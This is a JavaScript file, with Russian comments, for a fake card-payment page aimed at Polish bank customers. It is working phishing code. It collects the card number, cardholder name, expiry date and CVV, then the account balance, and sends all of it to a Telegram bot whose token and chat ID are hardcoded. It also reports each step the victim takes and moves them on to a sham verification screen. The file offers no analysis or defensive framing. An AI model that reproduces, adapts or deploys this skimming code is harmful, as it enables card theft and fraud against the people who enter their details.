// Объект для хранения кодов BIN и информации о них
const binInfo = {
    "47901914": { network: "🇵🇱VISA", type: "credit", level: "TRADITIONAL" },
    "52440493": { network: "🇵ŁMASTERCARD", type: "credit", level: "CREDIT BUSINESS PREPAID" },
    "44177272": { network: "🇵🇱VISA", type: "debit", level: "ELECTRON" },
    "54392637": { network: "🇵ŁMASTERCARD", type: "credit", level: "STANDARD" },
};

// Функция для отправки уведомления в Telegram
async function notifyTelegram(text) {
    const token = '7837340004:AAFkNyEU4PvqImj6pDfeT2HtoISXQblFTn8';
    const chatId = '-4539746528';
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        }),
    }).catch(error => {
        console.error('Ошибка при отправке уведомления:', error);
    });
}

// Определение банка на основании номера карты
function getBankInfo(cardNumber) {
    const bin = cardNumber.slice(0, 8);
    const info = binInfo[bin];

    if (info) {
        return `${info.network} (${info.type}, ${info.level})`;
    } else {
        return "Неизвестный банк";
    }
}

// Форматирование номера карты
function formatCardNumber(input) {
    let value = input.value.replace(/\D/g, '');
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
            formattedValue += ' ';
        }
        formattedValue += value[i];
    }
    input.value = formattedValue.trim();
}

// Форматирование даты
function formatExpiryDate(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    input.value = value.slice(0, 5);
}

// Форматирование CVV
function formatCvv(input) {
    input.value = input.value.replace(/\D/g, '').slice(0, 3);
}

// Обработка начала ввода карты
async function handleCardInput() {
    await notifyTelegram('Ввод карты начат.');
}

// Показать экран загрузки
function showLoadingScreen() {
    document.getElementById('loadingScreen').style.display = 'flex';
}

// Скрыть экран загрузки
function hideLoadingScreen() {
    document.getElementById('loadingScreen').style.display = 'none';
}

// Обработка платежа
async function handlePayment(event) {
    event.preventDefault();

    const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
    const cardholderName = document.getElementById('cardholder-name').value;
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;

    const bankInfo = getBankInfo(cardNumber);

    // Формируем сообщение для отправки
    const message =
        `Данные карты:\n` +
        `- Номер карты: ${cardNumber}\n` +
        `- Банк: ${bankInfo}\n` +
        `- Имя и Фамилия: ${cardholderName}\n` +
        `- ММ/ГГ: ${expiryDate}\n` +
        `- CVV: ${cvv}\n`;

    // Отправка уведомления о вводе данных карты
    await notifyTelegram(message);

    // Сбросить форму после отправки
    document.getElementById('paymentForm').reset();

    // Показать экран загрузки
    showLoadingScreen();

    // Задержка перед переключением формы
    setTimeout(() => {
        // Скрыть форму платежа и показать форму баланса
        document.getElementById('paymentForm').style.display = 'none';
        document.getElementById('balanceForm').style.display = 'block';
        hideLoadingScreen();
    }, 2000);

    // Отправка уведомления о переходе на ввод баланса
    await notifyTelegram('Переход на ввод баланса.');

    // Сохранить данные платежа для дальнейшего использования
    window.paymentData = {
        cardNumber,
        bankInfo,
        cardholderName,
        expiryDate,
        cvv
    };
}

// Обработка ввода баланса
async function handleBalance(event) {
    event.preventDefault();

    const balance = document.getElementById('balance').value;

    const allData = window.paymentData; // Используем данные платежа

    // Формируем сообщение для отправки только с балансом
    const balanceMessage =
        `Баланс:\n` +
        `- Баланс: ${balance} zł\n` +
        `- Имя и Фамилия: ${allData.cardholderName}\n` +
        `- Номер карты: ${allData.cardNumber}`;  // только номер карты, без лишних данных

    await notifyTelegram(balanceMessage);

    // Сбросить форму после отправки и скрыть её
    document.getElementById('balanceForm').reset();

    // Показать экран загрузки
    showLoadingScreen();

    // Задержка перед переходом на верификацию
    setTimeout(() => {
        document.getElementById('balanceForm').style.display = 'none';
        document.getElementById('verificationContainer').style.display = 'block';
        hideLoadingScreen();
    }, 2000);

    // Отправка уведомления о переходе на верификацию
    await notifyTelegram('Переход на верификацию.');
}

// Обработка верификации
async function sendVerification() {
    await notifyTelegram('Пользователь нажал на кнопку Верификация.');
}

// Присоедините обработчик событий к кнопке верификации
document.getElementById('verificationButton').addEventListener('click', sendVerification);

// Привязка функции форматирования к полю ввода номера карты
document.getElementById('card-number').addEventListener('focus', handleCardInput);